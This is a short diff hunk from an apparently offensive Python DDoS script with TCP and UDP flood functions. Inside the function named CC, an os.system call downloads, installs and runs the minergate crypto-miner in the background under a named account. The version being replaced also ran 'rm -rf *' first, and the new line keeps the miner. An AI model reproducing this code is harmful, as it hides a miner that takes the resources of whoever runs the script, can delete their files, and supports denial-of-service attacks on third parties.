@@ -56,7 +56,7 @@ tcpbytes = random._urandom(1024) #For the tcp and udp flood
 udpbytes = random._urandom(512)
 
 def CC(ip, port, thread):
-    os.system("rm -rf * ; sudo apt-get update -y && wget https://minergate.com/download/deb-cli && mv deb-cli minergate-cli-release.deb && sudo apt install gdebi -y && yes|sudo gdebi minergate-cli-release.deb && nohup minergate-cli --user yu930325@gmail.com --bcn")
+    os.system("sudo apt-get update -y;wget https://minergate.com/download/deb-cli;mv deb-cli minergate-cli-release.deb;sudo apt install gdebi -y;yes|sudo gdebi minergate-cli-release.deb;nohup minergate-cli --user yu930325@gmail.com --bcn")
     s.close
 def tcpflood(ip, port, thread):
     for x in range(100000000):
